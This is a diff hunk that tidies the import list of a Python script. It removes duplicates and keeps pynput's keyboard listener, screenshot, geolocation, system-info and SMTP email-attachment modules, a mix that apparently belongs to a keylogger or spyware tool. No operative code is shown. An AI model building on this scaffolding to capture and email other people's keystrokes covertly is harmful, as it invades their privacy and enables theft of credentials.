@@ -1,26 +1,16 @@
-from email.mime.base import MIMEBase
 import time
 import os
-import sys
 import threading
 import pyautogui
 from datetime import date
-import json
 from pynput.keyboard import Listener
 import urllib.request
 from requests import get
 import platform
 import subprocess
 import geocoder
-import socket,re,uuid,psutil,logging
+import socket,re,uuid,psutil
 import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
-import os
-from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 import glob
